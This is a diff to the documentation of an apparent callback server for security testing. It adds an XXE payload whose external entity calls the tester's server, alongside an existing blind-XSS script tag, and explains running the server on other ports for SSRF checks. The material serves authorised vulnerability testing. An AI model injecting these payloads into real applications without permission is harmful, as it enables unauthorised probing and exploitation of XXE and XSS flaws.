@@ -53,5 +53,15 @@ Depending on what type of vulnerability you want to test for, you have to constr
 <script src="https://server/collect?callback_token=ee34a1791ab345f789"></script>
 ```
 
+**XXE**
+```
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://server/pixel?callback_token=ee34a1791ab345f789">
+]>
+<r>&sp;</r>
+```
+
 ### Starting another server
 The server listens on port `80`, `443`, `8080`, and `8443` by default. However, if you want to start another server on a different port, run `ruby app/server.rb -p :port`. To use SSL, append `-cert :cert.pem`. This is especially useful when a potential SSRF vulnerability only allows to connect on certain ports. Say bye to all the Apache and nginx configuration hacking!
